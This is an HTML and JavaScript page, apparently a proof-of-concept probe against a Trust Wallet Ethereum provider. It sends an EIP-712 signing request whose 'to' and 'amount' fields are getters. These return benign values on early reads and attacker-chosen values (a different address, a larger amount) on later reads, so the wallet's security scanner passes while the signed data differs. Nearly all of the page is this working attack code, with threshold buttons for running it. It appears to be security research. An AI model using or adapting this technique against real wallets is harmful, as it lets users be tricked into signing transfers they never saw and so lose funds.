<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>trust map — auto collect</title>
<style>
  :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
          --ok:#3fb950; --bad:#f85149; --dim:#7d8590; --accent:#58a6ff; }
  * { box-sizing:border-box; }
  body { margin:0; font:12px/1.4 ui-monospace,Menlo,monospace;
         background:var(--bg); color:var(--txt); padding:10px; }
  .panel { background:var(--panel); border:1px solid var(--line);
           border-radius:6px; padding:10px; margin-bottom:8px; max-width:900px; }
  h2 { font-size:11px; margin:0 0 6px; color:var(--dim); text-transform:uppercase; }
  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
           border-radius:4px; padding:6px 12px; font:inherit; cursor:pointer; margin:2px; }
  button:hover { border-color:var(--dim); }
  button.primary { border-color:var(--accent); color:var(--accent); }
  button:disabled { opacity:.4; cursor:not-allowed; }
  pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
        padding:8px; max-height:400px; overflow:auto; white-space:pre-wrap;
        word-break:break-all; font-size:11px; margin:4px 0; }
  .kv { display:grid; grid-template-columns:120px 1fr; gap:2px 8px; }
  .kv b { color:var(--dim); font-weight:400; }
  .hl { color:var(--bad); }
  .hl-ok { color:var(--ok); }
</style>
</head>
<body>

<div class="panel">
  <h2>environment</h2>
  <div class="kv" id="env"></div>
</div>

<div class="panel">
  <h2>auto collect — clean getter (to/amount only)</h2>
  <p style="color:var(--dim);margin:0 0 8px">
    Getter on to/amount. Read #1 (y/x/M) = LEGIT. Read #2 (stringify) = EVIL.
    No BigInt, no NaN, no exceptions. Scanner should pass.
  </p>
  <div id="btns"></div>
  <pre id="out">—</pre>
</div>

<div class="panel">
  <h2>raw read log (stack per read)</h2>
  <pre id="reads">—</pre>
</div>

<script>
const ORIGIN = location.origin;
const IS_REAL = !!window.ethereum;

const log = (kind, data) => {
  const el = document.getElementById('out');
  const line = `[${new Date().toISOString().slice(11,23)}] ${kind}`;
  const body = data ? '\n' + JSON.stringify(data, null, 2) : '';
  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
  el.scrollTop = el.scrollHeight;
};

const readLog = (n, field, value, stack) => {
  const el = document.getElementById('reads');
  const line = `READ #${n} · ${field} · ${value} · stack: ${stack}`;
  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + '\n';
};

const renderEnv = () => {
  document.getElementById('env').innerHTML = `
    <b>origin</b><span>${ORIGIN}</span>
    <b>ethereum</b><span class="${IS_REAL ? 'hl-ok' : 'hl'}">${IS_REAL}</span>
    <b>isTrust</b><span>${IS_REAL && window.ethereum.isTrust ? 'yes' : 'no'}</span>
  `;
};

const ensureAccount = async () => {
  if (!window.ethereum) throw new Error('no ethereum');
  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
  return accounts[0];
};

// чистый getter: no throw, no BigInt, no extra fields
const buildCleanGetter = (threshold) => {
  let reads = 0;
  const trap = {
    get to() {
      reads++;
      const v = reads <= threshold
        ? '0x0000000000000000000000000000000000000000'
        : '0x000000000000000000000000000000000000dEaD';
      readLog(reads, 'to', v, new Error().stack.split('\n').slice(1,4).join(' | '));
      return v;
    },
    get amount() {
      reads++;
      const v = reads <= threshold ? '100' : '999999';
      readLog(reads, 'amount', v, new Error().stack.split('\n').slice(1,4).join(' | '));
      return v;
    },
  };
  return trap;
};

const baseTyped = (chainId, message) => ({
  domain: { name: 'Tokdie', version: '1', chainId, verifyingContract: '0x0000000000000000000000000000000000000000' },
  types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
  primaryType: 'Order',
  message,
});

const runProbe = async (threshold) => {
  if (!IS_REAL) return log('ERR', { message: 'no ethereum' });
  document.getElementById('reads').textContent = '—';
  try {
    const from = await ensureAccount();
    const chainHex = await window.ethereum.request({ method: 'eth_chainId' });
    const chainId = parseInt(chainHex, 16);
    log('ENV', { from, chainId, threshold });

    const message = buildCleanGetter(threshold);
    const typed = baseTyped(chainId, message);

    log('SENDING', { threshold, chainId, note: 'getter inside message' });
    const sig = await window.ethereum.request({
      method: 'eth_signTypedData_v4',
      params: [from, typed],
    });
    log('SIG', { sig, threshold });
  } catch (e) {
    log('ERR', { code: e.code, message: e.message, raw: String(e), threshold });
  }
};

// buttons
const btns = document.getElementById('btns');
for (const t of [1, 2, 3, 4, 5]) {
  const b = document.createElement('button');
  b.textContent = `threshold ${t}`;
  b.className = 'primary';
  b.onclick = () => runProbe(t);
  btns.appendChild(b);
}

renderEnv();
log('BOOT', { origin: ORIGIN, real: IS_REAL });
</script>
</body>
</html>
